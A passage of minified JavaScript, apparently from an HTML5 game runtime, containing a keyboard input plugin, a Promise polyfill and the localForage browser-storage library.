0!==console.groupEnd;t?(console.groupCollapsed(h+":"),console.log(s.stringify(this.data[h],null,2)),console.groupEnd()):console.log(h+":",s.stringify(this.data[h],null,2)),console.log("Current Path:",s.stringify(this.curPath)),t?console.group("References:"):console.log("References:");var e,i=this.type.plugin.references;for(e in i)Object.prototype.hasOwnProperty.call(i,e)&&(t?(console.groupCollapsed(e),console.log(s.stringify(i[e].value,null,2)),console.groupEnd()):console.log("["+e+"]",s.stringify(i[e].value,null,2)));t&&console.groupEnd(),console.log("")},l.prototype.SetCurrentPath=function(t,e){this.curPath=t?this.curPath.concat(e):e.slice()},l.prototype.PushPathNode=function(t){this.curPath.push(t)},l.prototype.PopPathNode=function(){this.curPath.pop()},l.prototype.SaveReference=function(t,e,i){this.type.plugin.references[t]={value:this.getValueFromPath(1===e,i),origin:this}},l.prototype.LoadReference=function(t,e,i){this.setValueFromPath(1===e,i,this.type.plugin.references[t].value)},l.prototype.DeleteReference=function(t){delete this.type.plugin.references[t]},l.prototype.DeleteAllReferences=function(t){this.type.plugin.references={}},t.acts=new l,u.prototype.Size=function(t){var e=Array.prototype.slice.call(arguments);e.shift();var i=e.shift(),s=this.getValueFromPath(1===i,e),e=c(s);if("array"===e)t.set_int(s.length);else if("object"===e){var n,r=0;for(n in s)Object.prototype.hasOwnProperty.call(s,n)&&r++;t.set_int(r)}else t.set_int(-1)},u.prototype.Value=function(t){var e=Array.prototype.slice.call(arguments);e.shift();var i=e.shift(),i=this.getValueFromPath(1===i,e),e=c(i);"number"===e||"string"===e?t.set_any(i):"boolean"===e?t.set_any(i?1:0):t.set_any(e)},u.prototype.AsJson=function(t){var e=Array.prototype.slice.call(arguments);e.shift();var i=e.shift(),i=this.getValueFromPath(1===i,e),e=c(i);"undefined"===e?t.set_string(e):t.set_string(s.stringify(i))},u.prototype.TypeOf=function(t){var e=Array.prototype.slice.call(arguments);e.shift();var i=e.shift(),e=this.getValueFromPath(1===i,e);t.set_string(c(e))},u.prototype.CurrentKey=function(t){t.set_string(this.curKey)},u.prototype.CurrentValue=function(t){var e=this.curValue,i=c(e);"number"===i||"string"===i?t.set_any(e):"boolean"===i?t.set_any(e?1:0):t.set_any(i)},t.exps=new u}(),cr.plugins_.Keyboard=function(t){this.runtime=t},function(){var t=cr.plugins_.Keyboard.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime,this.keyMap=new Array(256),this.usedKeys=new Array(256),this.triggerKey=0};var e=t.Instance.prototype;e.onCreate=function(){var e=this;this.runtime.isDomFree||(jQuery(document).keydown(function(t){e.onKeyDown(t)}),jQuery(document).keyup(function(t){e.onKeyUp(t)}))};var n=[32,33,34,35,36,37,38,39,40,44];function i(){}function s(){}e.onKeyDown=function(t){var e,i,s=!1;window!=window.top&&-1<n.indexOf(t.which)&&(t.preventDefault(),s=!0,t.stopPropagation()),this.keyMap[t.which]?this.usedKeys[t.which]&&!s&&t.preventDefault():(this.keyMap[t.which]=!0,this.triggerKey=t.which,this.runtime.isInUserInputEvent=!0,this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnAnyKey,this),e=this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnKey,this),i=this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnKeyCode,this),this.runtime.isInUserInputEvent=!1,(e||i)&&(this.usedKeys[t.which]=!0,s||t.preventDefault()))},e.onKeyUp=function(t){this.keyMap[t.which]=!1,this.triggerKey=t.which,this.runtime.isInUserInputEvent=!0,this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnAnyKeyReleased,this);var e=this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnKeyReleased,this),i=this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnKeyCodeReleased,this);this.runtime.isInUserInputEvent=!1,(e||i||this.usedKeys[t.which])&&(this.usedKeys[t.which]=!0,t.preventDefault())},e.onWindowBlur=function(){for(var t,e,i=0;i<256;++i)this.keyMap[i]&&(this.keyMap[i]=!1,this.triggerKey=i,this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnAnyKeyReleased,this),t=this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnKeyReleased,this),e=this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnKeyCodeReleased,this),(t||e)&&(this.usedKeys[i]=!0))},e.saveToJSON=function(){return{triggerKey:this.triggerKey}},e.loadFromJSON=function(t){this.triggerKey=t.triggerKey},i.prototype.IsKeyDown=function(t){return this.keyMap[t]},i.prototype.OnKey=function(t){return t===this.triggerKey},i.prototype.OnAnyKey=function(t){return!0},i.prototype.OnAnyKeyReleased=function(t){return!0},i.prototype.OnKeyReleased=function(t){return t===this.triggerKey},i.prototype.IsKeyCodeDown=function(t){return!((t=Math.floor(t))<0||t>=this.keyMap.length)&&this.keyMap[t]},i.prototype.OnKeyCode=function(t){return t===this.triggerKey},i.prototype.OnKeyCodeReleased=function(t){return t===this.triggerKey},t.cnds=new i,t.acts=new function(){},s.prototype.LastKeyCode=function(t){t.set_int(this.triggerKey)},s.prototype.StringFromKeyCode=function(t,e){t.set_string(function(t){switch(t=Math.floor(t)){case 8:return"backspace";case 9:return"tab";case 13:return"enter";case 16:return"shift";case 17:return"control";case 18:return"alt";case 19:return"pause";case 20:return"capslock";case 27:return"esc";case 33:return"pageup";case 34:return"pagedown";case 35:return"end";case 36:return"home";case 37:return"â†";case 38:return"â†‘";case 39:return"â†’";case 40:return"â†“";case 45:return"insert";case 46:return"del";case 91:return"left window key";case 92:return"right window key";case 93:return"select";case 96:return"numpad 0";case 97:return"numpad 1";case 98:return"numpad 2";case 99:return"numpad 3";case 100:return"numpad 4";case 101:return"numpad 5";case 102:return"numpad 6";case 103:return"numpad 7";case 104:return"numpad 8";case 105:return"numpad 9";case 106:return"numpad *";case 107:return"numpad +";case 109:return"numpad -";case 110:return"numpad .";case 111:return"numpad /";case 112:return"F1";case 113:return"F2";case 114:return"F3";case 115:return"F4";case 116:return"F5";case 117:return"F6";case 118:return"F7";case 119:return"F8";case 120:return"F9";case 121:return"F10";case 122:return"F11";case 123:return"F12";case 144:return"numlock";case 145:return"scroll lock";case 186:return";";case 187:return"=";case 188:return",";case 189:return"-";case 190:return".";case 191:return"/";case 192:return"'";case 219:return"[";case 220:return"\\";case 221:return"]";case 222:return"#";case 223:return"`";default:return String.fromCharCode(t)}}(e))},t.exps=new s}();var localForageInitFailed=!1;try{!function(){var t,a,h,c,l;c={},l={},h=a=function(o){if(h._eak_seen=c,l[o])return l[o];if(l[o]={},!c[o])throw new Error("Could not find module "+o);for(var t,e=c[o],i=e.deps,e=e.callback,s=[],n=0,r=i.length;n<r;n++)"exports"===i[n]?s.push(t={}):s.push(a(function(t){if("."!==t.charAt(0))return t;for(var e=t.split("/"),i=o.split("/").slice(0,-1),s=0,n=e.length;s<n;s++){var r=e[s];".."===r?i.pop():"."!==r&&i.push(r)}return i.join("/")}(i[n])));e=e.apply(this,s);return l[o]=t||e},(t=function(t,e,i){c[t]={deps:e,callback:i}})("promise/all",["./utils","exports"],function(t,e){"use strict";var i=t.isArray,h=t.isFunction;e.all=function(a){if(!i(a))throw new TypeError("You must pass an array to all.");return new this(function(i,t){function s(t,e){n[t]=e,0==--r&&i(n)}var e,n=[],r=a.length;0===r&&i([]);for(var o=0;o<a.length;o++)(e=a[o])&&h(e.then)?e.then(function(e){return function(t){s(e,t)}}(o),t):s(o,e)})}}),t("promise/asap",["exports"],function(t){"use strict";function e(){for(var t=0;t<h.length;t++){var e=h[t];(0,e[0])(e[1])}h=[]}var i,s,n,r=void 0!==window?window:{},o=r.MutationObserver||r.WebKitMutationObserver,a="undefined"!=typeof global?global:void 0===this?window:this,h=[],c="undefined"!=typeof process&&"[object process]"==={}.toString.call(process)?function(){process.nextTick(e)}:o?(i=0,s=new o(e),n=document.createTextNode(""),s.observe(n,{characterData:!0}),function(){n.data=i=++i%2}):function(){a.setTimeout(e,1)};t.asap=function(t,e){1===h.push([t,e])&&c()}}),t("promise/config",["exports"],function(t){"use strict";var i={instrument:!1};t.config=i,t.configure=function(t,e){return 2!==arguments.length?i[t]:void(i[t]=e)}}),t("promise/polyfill",["./promise","./utils","exports"],function(t,e,i){"use strict";var s=t.Promise,n=e.isFunction;i.polyfill=function(){var e,t="undefined"!=typeof global?global:void 0!==window&&window.document?window:self;"Promise"in t&&"resolve"in t.Promise&&"reject"in t.Promise&&"all"in t.Promise&&"race"in t.Promise&&(new t.Promise(function(t){e=t}),n(e))||(t.Promise=s)}}),t("promise/promise",["./config","./utils","./all","./race","./resolve","./reject","./asap","exports"],function(t,e,i,s,n,r,o,a){"use strict";function h(t){if(!v(t))throw new TypeError("You must pass a resolver function as the first argument to the promise constructor");if(!(this instanceof h))throw new TypeError("Failed to construct 'Promise': Please use the 'new' operator, this object constructor cannot be called as a function.");this._subscribers=[],function(t,e){function i(t){g(e,t)}try{t(function(t){p(e,t)},i)}catch(t){i(t)}}(t,this)}function c(t,e,i,s){var n,r,o,a,h=v(i);if(h)try{n=i(s),o=!0}catch(t){a=!0,r=t}else n=s,o=!0;u(e,n)||(h&&o?p(e,n):a?g(e,r):t===x?p(e,n):t===S&&g(e,n))}function l(t,e){for(var i=t._subscribers,s=t._detail,n=0;n<i.length;n+=3)c(e,i[n],i[n+e],s);t._subscribers=null}function u(e,i){var s,t=null;try{if(e===i)throw new TypeError("A promises callback cannot return that same promise.");if(_(i)&&(t=i.then,v(t)))return t.call(i,function(t){return!!s||(s=!0,void(i!==t?p:d)(e,t))},function(t){return!!s||(s=!0,void g(e,t))}),1}catch(t){return s||g(e,t),1}}function p(t,e){t!==e&&u(t,e)||d(t,e)}function d(t,e){t._state===b&&(t._state=w,t._detail=e,y.async(f,t))}function g(t,e){t._state===b&&(t._state=w,t._detail=e,y.async(m,t))}function f(t){l(t,t._state=x)}function m(t){l(t,t._state=S)}var y=t.config,_=(t.configure,e.objectOrFunction),v=e.isFunction,i=(e.now,i.all),s=s.race,n=n.resolve,r=r.reject,o=o.asap;y.async=o;var b=void 0,w=0,x=1,S=2;h.prototype={constructor:h,_state:void 0,_detail:void 0,_subscribers:void 0,then:function(t,e){var i,s,n,r,o=this,a=new this.constructor(function(){});return this._state?(i=arguments,y.async(function(){c(o._state,a,i[o._state-1],o._detail)})):(s=a,n=t,r=e,t=(e=(t=this)._subscribers).length,e[t]=s,e[t+x]=n,e[t+S]=r),a},catch:function(t){return this.then(null,t)}},h.all=i,h.race=s,h.resolve=n,h.reject=r,a.Promise=h}),t("promise/race",["./utils","exports"],function(t,e){"use strict";var i=t.isArray;e.race=function(n){if(!i(n))throw new TypeError("You must pass an array to race.");return new this(function(t,e){for(var i,s=0;s<n.length;s++)(i=n[s])&&"function"==typeof i.then?i.then(t,e):t(i)})}}),t("promise/reject",["exports"],function(t){"use strict";t.reject=function(i){return new this(function(t,e){e(i)})}}),t("promise/resolve",["exports"],function(t){"use strict";t.resolve=function(e){return e&&"object"==typeof e&&e.constructor===this?e:new this(function(t){t(e)})}}),t("promise/utils",["exports"],function(t){"use strict";function e(t){return"function"==typeof t}var i=Date.now||function(){return(new Date).getTime()};t.objectOrFunction=function(t){return e(t)||"object"==typeof t&&null!==t},t.isFunction=e,t.isArray=function(t){return"[object Array]"===Object.prototype.toString.call(t)},t.now=i}),a("promise/polyfill").polyfill()}(),function(t,e){"object"==typeof exports&&"object"==typeof module?module.exports=e():"function"==typeof define&&define.amd?define([],e):"object"==typeof exports?exports.localforage=e():t.localforage=e()}(this,function(){return n={},i.m=s=[function(t,e,r){"use strict";e.__esModule=!0;var i,s,c,n,o,l,a,u,h,i=(i=void 0!==window?window:self,c={},o=[(n={INDEXEDDB:"asyncStorage",LOCALSTORAGE:"localStorageWrapper",WEBSQL:"webSQLStorage"}).INDEXEDDB,n.WEBSQL,n.LOCALSTORAGE],l=["clear","getItem","iterate","key","keys","length","removeItem","setItem"],a={description:"",driver:o.slice(),name:"localforage",size:4980736,storeName:"keyvaluepairs",version:1},s=i,(i={})[n.INDEXEDDB]=!!function(){try{var t=s.indexedDB||s.webkitIndexedDB||s.mozIndexedDB||s.OIndexedDB||s.msIndexedDB;return(!(void 0!==s.openDatabase&&s.navigator&&s.navigator.userAgent&&/Safari/.test(s.navigator.userAgent))||/Chrome/.test(s.navigator.userAgent))&&(t&&"function"==typeof t.open&&void 0!==s.IDBKeyRange)}catch(t){return}}(),i[n.WEBSQL]=!!function(){try{return s.openDatabase}catch(t){return}}(),i[n.LOCALSTORAGE]=!!function(){try{return s.localStorage&&"setItem"in s.localStorage&&s.localStorage.setItem}catch(t){return}}(),u=i,h=Array.isArray||function(t){return"[object Array]"===Object.prototype.toString.call(t)},new(g.prototype.config=function(t){if("object"!=typeof t)return"string"==typeof t?this._config[t]:this._config;if(this._ready)return new Error("Can't call config() after localforage has been used.");for(var e in t)"storeName"===e&&(t[e]=t[e].replace(/\W/g,"_")),this._config[e]=t[e];return"driver"in t&&t.driver&&this.setDriver(this._config.driver),!0},g.prototype.defineDriver=function(h,t,e){var i=new Promise(function(e,i){try{var s=h._driver,t=new Error("Custom driver not compliant; see https://mozilla.github.io/localForage/#definedriver"),n=new Error("Custom driver name already in use: "+h._driver);if(!h._driver)return void i(t);if(d(h._driver))return void i(n);for(var r=l.concat("_initStorage"),o=0;o<r.length;o++){var a=r[o];if(!a||!h[a]||"function"!=typeof h[a])return void i(t)}n=Promise.resolve(!0);"_support"in h&&(n=h._support&&"function"==typeof h._support?h._support():Promise.resolve(!!h._support)),n.then(function(t){u[s]=t,c[s]=h,e()},i)}catch(t){i(t)}});return i.then(t,e),i},g.prototype.driver=function(){return this._driver||null},g.prototype.getDriver=function(t,e,i){var s=this,n=function(){if(d(t))switch(t){case s.INDEXEDDB:return new Promise(function(t,e){t(r(1))});case s.LOCALSTORAGE:return new Promise(function(t,e){t(r(2))});case s.WEBSQL:return new Promise(function(t,e){t(r(4))})}else if(c[t])return Promise.resolve(c[t]);return Promise.reject(new Error("Driver not found."))}();return n.then(e,i),n},g.prototype.getSerializer=function(e){var t=new Promise(function(t,e){t(r(3))});return e&&"function"==typeof e&&t.then(function(t){e(t)}),t},g.prototype.ready=function(t){var e=this,i=e._driverSet.then(function(){return null===e._ready&&(e._ready=e._initDriver()),e._ready});return i.then(t,t),i},g.prototype.setDriver=function(t,e,i){function r(){o._config.driver=o.driver()}function s(n){return function(){var s=0;return function t(){for(;s<n.length;){var e=n[s];return s++,o._dbInfo=null,o._ready=null,o.getDriver(e).then(function(t){return o._extend(t),r(),o._ready=o._initStorage(o._config),o._ready}).catch(t)}r();var i=new Error("No available storage method found.");return o._driverSet=Promise.reject(i),o._driverSet}()}}var o=this;h(t)||(t=[t]);var n=this._getSupportedDrivers(t),t=null!==this._driverSet?this._driverSet.catch(function(){return Promise.resolve()}):Promise.resolve();return this._driverSet=t.then(function(){var t=n[0];return o._dbInfo=null,o._ready=null,o.getDriver(t).then(function(t){o._driver=t._driver,r(),o._wrapLibraryMethodsWithReady(),o._initDriver=s(n)})}).catch(function(){r();var t=new Error("No available storage method found.");return o._driverSet=Promise.reject(t),o._driverSet}),this._driverSet.then(e,i),this._driverSet},g.prototype.supports=function(t){return!!u[t]},g.prototype._extend=function(t){p(this,t)},g.prototype._getSupportedDrivers=function(t){for(var e=[],i=0,s=t.length;i<s;i++){var n=t[i];this.supports(n)&&e.push(n)}return e},g.prototype._wrapLibraryMethodsWithReady=function(){for(var t=0;t<l.length;t++)!function(e,i){e[i]=function(){var t=arguments;return e.ready().then(function(){return e[i].apply(e,t)})}}(this,l[t])},g.prototype.createInstance=function(t){return new g(t)},g));function p(t){for(var e=1;e<arguments.length;e++){var i=arguments[e];if(i)for(var s in i)i.hasOwnProperty(s)&&(h(i[s])?t[s]=i[s].slice():t[s]=i[s])}return t}function d(t){for(var e in n)if(n.hasOwnProperty(e)&&n[e]===t)return 1}function g(t){(function(t){if(!(t instanceof g))throw new TypeError("Cannot call a class as a function")})(this),this.INDEXEDDB=n.INDEXEDDB,this.LOCALSTORAGE=n.LOCALSTORAGE,this.WEBSQL=n.WEBSQL,this._defaultConfig=p({},a),this._config=p({},this._defaultConfig,t),this._driverSet=null,this._initDriver=null,this._ready=!1,this._dbInfo=null,this._wrapLibraryMethodsWithReady(),this.setDriver(this._config.driver)}e.default=i,t.exports=e.default},function(t,e){"use strict";e.__esModule=!0;var i=function(l){function r(e,i){e=e||[],i=i||{};try{return new Blob(e,i)}catch(t){if("TypeError"!==t.name)throw t;for(var s=new(l.BlobBuilder||l.MSBlobBuilder||l.MozBlobBuilder||l.WebKitBlobBuilder),n=0;n<e.length;n+=1)s.append(e[n]);return s.getBlob(i.type)}}function h(n){return new Promise(function(i,e){var t=r([""],{type:"image/png"}),s=n.transaction([y],"readwrite");s.objectStore(y).put(t,"key"),s.oncomplete=function(){var t=n.transaction([y],"readwrite").objectStore(y).get("key");t.onerror=e,t.onsuccess=function(t){var s,t=t.target.result,e=URL.createObjectURL(t);s=e,new Promise(function(t,e){var i=new XMLHttpRequest;i.open("GET",s),i.withCredentials=!0,i.responseType="arraybuffer",i.onreadystatechange=function(){return 4===i.readyState?200===i.status?t({response:i.response,type:i.getResponseHeader("Content-Type")}):void e({status:i.status,response:i.response}):void 0},i.send()}).then(function(t){i(!(!t||"image/png"!==t.type))},function(){i(!1)}).then(function(){URL.revokeObjectURL(e)})}},s.onerror=s.onabort=e}).catch(function(){return!1})}function a(t){return r([function(t){for(var e=t.length,i=new ArrayBuffer(e),s=new Uint8Array(i),n=0;n<e;n++)s[n]=t.charCodeAt(n);return i}(atob(t.data))],{type:t.type})}function c(t){return t&&t.__local_forage_encoded_blob}function u(t){var e=this,i=e._initReady().then(function(){var t=m[e._dbInfo.name];return t&&t.dbReady?t.dbReady:void 0});return i.then(t,t),i}function p(r,o){return new Promise(function(e,t){if(r.db){if(!o)return e(r.db);s=m[(s=r).name],(i={}).promise=new Promise(function(t){i.resolve=t}),s.deferredOperations.push(i),s.dbReady?s.dbReady=s.dbReady.then(function(){return i.promise}):s.dbReady=i.promise,r.db.close()}var i,s=[r.name];o&&s.push(r.version);var n=g.open.apply(g,s);o&&(n.onupgradeneeded=function(e){var t=n.result;try{t.createObjectStore(r.storeName),e.oldVersion<=1&&t.createObjectStore(y)}catch(t){if("ConstraintError"!==t.name)throw t;l.console.warn('The database "'+r.name+'" has been upgraded from version '+e.oldVersion+" to version "+e.newVersion+', but the storage "'+r.storeName+'" already exists.')}}),n.onerror=function(){t(n.error)},n.onsuccess=function(){var t;e(n.result),(t=m[(t=r).name].deferredOperations.pop())&&t.resolve()}})}function d(t,e){e&&t.then(function(t){e(null,t)},function(t){e(t)})}var g=g||l.indexedDB||l.webkitIndexedDB||l.mozIndexedDB||l.OIndexedDB||l.msIndexedDB;if(g){var f,m,y="local-forage-detect-blob-support";return{_driver:"asyncStorage",_initStorage:function(t){function e(){return Promise.resolve()}var s=this,n={db:null};if(t)for(var i in t)n[i]=t[i];var r=(m=m||{})[n.name];r||(r={forages:[],db:null,dbReady:null,deferredOperations:[]},m[n.name]=r),r.forages.push(s),s._initReady||(s._initReady=s.ready,s.ready=u);for(var o=[],a=0;a<r.forages.length;a++){var h=r.forages[a];h!==s&&o.push(h._initReady().catch(e))}var c=r.forages.slice(0);return Promise.all(o).then(function(){return n.db=r.db,p(n,!1)}).then(function(t){return n.db=t,function(t,e){if(!t.db)return!0;var i=!t.db.objectStoreNames.contains(t.storeName),s=t.version<t.db.version,n=t.version>t.db.version;if(s&&(t.version!==e&&l.console.warn('The database "'+t.name+"\" can't be downgraded from version "+t.db.version+" to version "+t.version+"."),t.version=t.db.version),n||i)return!i||(i=t.db.version+1)>t.version&&(t.version=i),!0;return!1}(n,s._defaultConfig.version)?p(n,!0):t}).then(function(t){n.db=r.db=t,s._dbInfo=n;for(var e=0;e<c.length;e++){var i=c[e];i!==s&&(i._dbInfo.db=n.db,i._dbInfo.version=n.version)}})},iterate:function(r,t){var o=this,e=new Promise(function(n,e){o.ready().then(function(){var t=o._dbInfo,i=t.db.transaction(t.storeName,"readonly").objectStore(t.storeName).openCursor(),s=1;i.onsuccess=function(){var t,e=i.result;e?(c(t=e.value)&&(t=a(t)),void 0!==(t=r(t,e.key,s++))?n(t):e.continue()):n()},i.onerror=function(){e(i.error)}}).catch(e)});return d(e,t),e},getItem:function(n,t){var r=this;"string"!=typeof n&&(l.console.warn(n+" used as a key, but it is not a string."),n=String(n));var e=new Promise(function(i,s){r.ready().then(function(){var t=r._dbInfo,e=t.db.transaction(t.storeName,"readonly").objectStore(t.storeName).get(n);e.onsuccess=function(){var t=e.result;void 0===t&&(t=null),c(t)&&(t=a(t)),i(t)},e.onerror=function(){s(e.error)}}).catch(s)});return d(e,t),e},setItem:function(a,e,t){var i=this;"string"!=typeof a&&(l.console.warn(a+" used as a key, but it is not a string."),a=String(a));var s=new Promise(function(n,r){var o;i.ready().then(function(){return o=i._dbInfo,e instanceof Blob?(t=o.db,("boolean"==typeof f?Promise.resolve(f):h(t).then(function(t){return f=t})).then(function(t){return t?e:(s=e,new Promise(function(e,t){var i=new FileReader;i.onerror=t,i.onloadend=function(t){t=btoa(t.target.result||"");e({__local_forage_encoded_blob:!0,data:t,type:s.type})},i.readAsBinaryString(s)}));var s})):e;var t}).then(function(t){var e=o.db.transaction(o.storeName,"readwrite"),i=e.objectStore(o.storeName);null===t&&(t=void 0),e.oncomplete=function(){void 0===t&&(t=null),n(t)},e.onabort=e.onerror=function(){var t=s.error||s.transaction.error;r(t)};var s=i.put(t,a)}).catch(r)});return d(s,t),s},removeItem:function(r,t){var o=this;"string"!=typeof r&&(l.console.warn(r+" used as a key, but it is not a string."),r=String(r));var e=new Promise(function(s,n){o.ready().then(function(){var t=o._dbInfo,e=t.db.transaction(t.storeName,"readwrite"),i=e.objectStore(t.storeName).delete(r);e.oncomplete=function(){s()},e.onerror=function(){n(i.error)},e.onabort=function(){var t=i.error||i.transaction.error;n(t)}}).catch(n)});return d(e,t),e},clear:function(t){var r=this,e=new Promise(function(s,n){r.ready().then(function(){var t=r._dbInfo,e=t.db.transaction(t.storeName,"readwrite"),i=e.objectStore(t.storeName).clear();e.oncomplete=function(){s()},e.onabort=e.onerror=function(){var t=i.error||i.transaction.error;n(t)}}).catch(n)});return d(e,t),e},length:function(t){var n=this,e=new Promise(function(i,s){n.ready().then(function(){var t=n._dbInfo,e=t.db.transaction(t.storeName,"readonly").objectStore(t.storeName).count();e.onsuccess=function(){i(e.result)},e.onerror=function(){s(e.error)}}).catch(s)});return d(e,t),e},key:function(r,t){var o=this,e=new Promise(function(s,n){return r<0?void s(null):void o.ready().then(function(){var t=o._dbInfo,t=t.db.transaction(t.storeName,"readonly").objectStore(t.storeName),e=!1,i=t.openCursor();i.onsuccess=function(){var t=i.result;return t?void(0===r||e?s(t.key):(e=!0,t.advance(r))):void s(null)},i.onerror=function(){n(i.error)}}).catch(n)});return d(e,t),e},keys:function(t){var r=this,e=new Promise(function(s,n){r.ready().then(function(){var t=r._dbInfo,e=t.db.transaction(t.storeName,"readonly").objectStore(t.storeName).openCursor(),i=[];e.onsuccess=function(){var t=e.result;return t?(i.push(t.key),void t.continue()):void s(i)},e.onerror=function(){n(e.error)}}).catch(n)});return d(e,t),e}}}}(void 0!==window?window:self);e.default=i,t.exports=e.default},function(t,e,s){"use strict";e.__esModule=!0;var i=function(n){function r(t,e){e&&t.then(function(t){e(null,t)},function(t){e(t)})}var l=null;try{if(!(n.localStorage&&"setItem"in n.localStorage))return;l=n.localStorage}catch(t){return}return{_driver:"localStorageWrapper",_initStorage:function(t){var e={};if(t)for(var i in t)e[i]=t[i];return e.keyPrefix=e.name+"/",e.storeName!==this._defaultConfig.storeName&&(e.keyPrefix+=e.storeName+"/"),this._dbInfo=e,new Promise(function(t,e){t(s(3))}).then(function(t){return e.serializer=t,Promise.resolve()})},iterate:function(h,t){var c=this,e=c.ready().then(function(){for(var t=c._dbInfo,e=t.keyPrefix,i=e.length,s=l.length,n=1,r=0;r<s;r++){var o=l.key(r);if(0===o.indexOf(e)){var a=(a=l.getItem(o))&&t.serializer.deserialize(a);if(void 0!==(a=h(a,o.substring(i),n++)))return a}}});return r(e,t),e},getItem:function(i,t){var s=this;"string"!=typeof i&&(n.console.warn(i+" used as a key, but it is not a string."),i=String(i));var e=s.ready().then(function(){var t=s._dbInfo,e=l.getItem(t.keyPrefix+i);return e=e&&t.serializer.deserialize(e)});return r(e,t),e},setItem:function(o,t,e){var a=this;"string"!=typeof o&&(n.console.warn(o+" used as a key, but it is not a string."),o=String(o));var i=a.ready().then(function(){void 0===t&&(t=null);var r=t;return new Promise(function(i,s){var n=a._dbInfo;n.serializer.serialize(t,function(t,e){if(e)s(e);else try{l.setItem(n.keyPrefix+o,t),i(r)}catch(t){"QuotaExceededError"!==t.name&&"NS_ERROR_DOM_QUOTA_REACHED"!==t.name||s(t),s(t)}})})});return r(i,e),i},removeItem:function(e,t){var i=this;"string"!=typeof e&&(n.console.warn(e+" used as a key, but it is not a string."),e=String(e));var s=i.ready().then(function(){var t=i._dbInfo;l.removeItem(t.keyPrefix+e)});return r(s,t),s},clear:function(t){var s=this,e=s.ready().then(function(){for(var t=s._dbInfo.keyPrefix,e=l.length-1;0<=e;e--){var i=l.key(e);0===i.indexOf(t)&&l.removeItem(i)}});return r(e,t),e},length:function(t){var e=this.keys().then(function(t){return t.length});return r(e,t),e},key:function(i,t){var s=this,e=s.ready().then(function(){var e,t=s._dbInfo;try{e=l.key(i)}catch(t){e=null}return e=e&&e.substring(t.keyPrefix.length)});return r(e,t),e},keys:function(t){var n=this,e=n.ready().then(function(){for(var t=n._dbInfo,e=l.length,i=[],s=0;s<e;s++)0===l.key(s).indexOf(t.keyPrefix)&&i.push(l.key(s).substring(t.keyPrefix.length));return i});return r(e,t),e}}}(void 0!==window?window:self);e.default=i,t.exports=e.default},function(t,e){"use strict";e.__esModule=!0;var r,l,o,a,h,c,i=(r=void 0!==window?window:self,l="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",o=/^~~local_forage_type~([^~]+)~/,c=(h=(a="__lfsc__:").length)+"arbf".length,{serialize:function(e,i){var t="";if(e&&(t=e.toString()),e&&("[object ArrayBuffer]"===e.toString()||e.buffer&&"[object ArrayBuffer]"===e.buffer.toString())){var s,n=a;e instanceof ArrayBuffer?(s=e,n+="arbf"):(s=e.buffer,"[object Int8Array]"===t?n+="si08":"[object Uint8Array]"===t?n+="ui08":"[object Uint8ClampedArray]"===t?n+="uic8":"[object Int16Array]"===t?n+="si16":"[object Uint16Array]"===t?n+="ur16":"[object Int32Array]"===t?n+="si32":"[object Uint32Array]"===t?n+="ui32":"[object Float32Array]"===t?n+="fl32":"[object Float64Array]"===t?n+="fl64":i(new Error("Failed to get type for BinaryArray"))),i(n+p(s))}else if("[object Blob]"===t){t=new FileReader;t.onload=function(){var t="~~local_forage_type~"+e.type+"~"+p(this.result);i(a+"blob"+t)},t.readAsArrayBuffer(e)}else try{i(JSON.stringify(e))}catch(t){console.error("Couldn't convert value into a JSON string: ",e),i(null,t)}},deserialize:function(t){if(t.substring(0,h)!==a)return JSON.parse(t);var e,i=t.substring(c),s=t.substring(h,c);"blob"===s&&o.test(i)&&(e=(t=i.match(o))[1],i=i.substring(t[0].length));var n=u(i);switch(s){case"arbf":return n;case"blob":return function(e,i){e=e||[],i=i||{};try{return new Blob(e,i)}catch(t){if("TypeError"!==t.name)throw t;for(var s=new(r.BlobBuilder||r.MSBlobBuilder||r.MozBlobBuilder||r.WebKitBlobBuilder),n=0;n<e.length;n+=1)s.append(e[n]);return s.getBlob(i.type)}}([n],{type:e});case"si08":return new Int8Array(n);case"ui08":return new Uint8Array(n);case"uic8":return new Uint8ClampedArray(n);case"si16":return new Int16Array(n);case"ur16":return new Uint16Array(n);case"si32":return new Int32Array(n);case"ui32":return new Uint32Array(n);case"fl32":return new Float32Array(n);case"fl64":return new Float64Array(n);default:throw new Error("Unkown type: "+s)}},stringToBuffer:u,bufferToString:p});function u(t){var e,i,s,n,r=.75*t.length,o=t.length,a=0;"="===t[t.length-1]&&(r--,"="===t[t.length-2]&&r--);for(var r=new ArrayBuffer(r),h=new Uint8Array(r),c=0;c<o;c+=4)e=l.indexOf(t[c]),i=l.indexOf(t[c+1]),s=l.indexOf(t[c+2]),n=l.indexOf(t[c+3]),h[a++]=e<<2|i>>4,h[a++]=(15&i)<<4|s>>2,h[a++]=(3&s)<<6|63&n;return r}function p(t){for(var e=new Uint8Array(t),i="",s=0;s<e.length;s+=3)i+=l[e[s]>>2],i+=l[(3&e[s])<<4|e[s+1]>>4],i+=l[(15&e[s+1])<<2|e[s+2]>>6],i+=l[63&e[s+2]];return e.length%3==2?i=i.substring(0,i.length-1)+"=":e.length%3==1&&(i=i.substring(0,i.length-2)+"=="),i}e.default=i,t.exports=e.default},function(t,e,o){"use strict";e.__esModule=!0;var i=function(s){function h(t,e){e&&t.then(function(t){e(null,t)},function(t){e(t)})}var r=s.openDatabase;if(r)return{_driver:"webSQLStorage",_initStorage:function(t){var s=this,n={db:null};if(t)for(var e in t)n[e]="string"!=typeof t[e]?t[e].toString():t[e];var i=new Promise(function(e,i){try{n.db=r(n.name,String(n.version),n.description,n.size)}catch(t){return i(t)}n.db.transaction(function(t){t.executeSql("CREATE TABLE IF NOT EXISTS "+n.storeName+" (id INTEGER PRIMARY KEY, key unique, value)",[],function(){s._dbInfo=n,e()},function(t,e){i(e)})})});return new Promise(function(t,e){t(o(3))}).then(function(t){return 